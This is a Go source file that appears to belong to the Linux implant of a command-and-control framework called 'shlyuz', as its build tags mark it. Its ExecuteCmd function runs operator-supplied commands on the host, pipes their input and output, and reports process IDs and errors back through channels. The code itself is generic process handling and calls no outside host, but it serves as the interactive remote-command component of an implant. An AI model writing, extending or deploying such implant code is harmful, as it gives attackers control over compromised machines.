//go:build linux,implant && (!lp || !teamserver)

package fireinteract

import (
	"errors" // For errors.New
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings"
)

// ExecuteCmd sets up an interactive session with a command on Linux.
// It uses standard OS pipes for stdin, stdout, and stderr, managed by os/exec.
// Input is read from inPipe, output (stdout & stderr merged) is written to outPipeWriter.
func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader, outPipeWriter io.Writer) error {
	log.Printf("CmdID %s (Linux): Setting up interactive command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string // For logging consistency

	if cmdDetails.Type == "Shell" {
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" {
			errMsg := "Args string is empty or invalid for Shell execution."
			log.Printf("CmdID %s (Linux): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg:
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
			return errors.New(errMsg) 
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args 
		log.Printf("CmdID %s (Linux): Using Shell execution (split args). Command: %s, Args: %v", cmdDetails.Id, executable, args)
	} else { // Direct execution for non-Shell type
		command = exec.Command(cmdDetails.Args) // Assumes cmdDetails.Args is the path to an executable
		displayCmdLine = cmdDetails.Args
		log.Printf("CmdID %s (Linux): Using Direct execution. Command: %s", cmdDetails.Id, cmdDetails.Args)
	}

	// Connect stdin
	if inPipe != nil {
		command.Stdin = inPipe
		log.Printf("CmdID %s (Linux): Stdin connected. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	} else {
		log.Printf("CmdID %s (Linux): No inPipe provided for stdin. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}

	// Connect stdout and stderr
	if outPipeWriter != nil {
		command.Stdout = outPipeWriter
		command.Stderr = outPipeWriter // Merge stdout and stderr
		log.Printf("CmdID %s (Linux): Stdout/Stderr connected. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	} else {
		log.Printf("CmdID %s (Linux): No outPipeWriter provided for stdout/stderr. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}
	
	// Start the command
	if err := command.Start(); err != nil {
		errMsg := "Error starting interactive command"
		log.Printf("CmdID %s (Linux): %s. CmdLine for logs: '%s', Error: %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Linux): Interactive command started successfully (PID: %d). CmdLine for logs: %s", cmdDetails.Id, command.Process.Pid, displayCmdLine)

	// Send PID
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Linux): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}

	// Goroutine to wait for command completion and manage pipe closure
	go func() {
		waitErr := command.Wait()
		if waitErr != nil {
			log.Printf("CmdID %s (Linux): Interactive command finished with error: %v. CmdLine for logs: %s", cmdDetails.Id, waitErr, displayCmdLine)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- waitErr.Error(): // Send the direct error from Wait()
				default: log.Printf("CmdID %s (Linux): StdErr channel full, dropping command wait error.", cmdDetails.Id)
				}
			}
		} else {
			log.Printf("CmdID %s (Linux): Interactive command finished successfully. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
		}

		if outPipeWriter != nil {
			if closer, ok := outPipeWriter.(io.Closer); ok {
				log.Printf("CmdID %s (Linux): Closing outPipeWriter. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
				if errClose := closer.Close(); errClose != nil {
					log.Printf("CmdID %s (Linux): Error closing outPipeWriter: %v. CmdLine for logs: %s", cmdDetails.Id, errClose, displayCmdLine)
					// Optionally, this close error could also be sent to execChannels.StdErr
				}
			}
		}
	}()

	return nil // Indicates successful start of the command and interaction setup
}
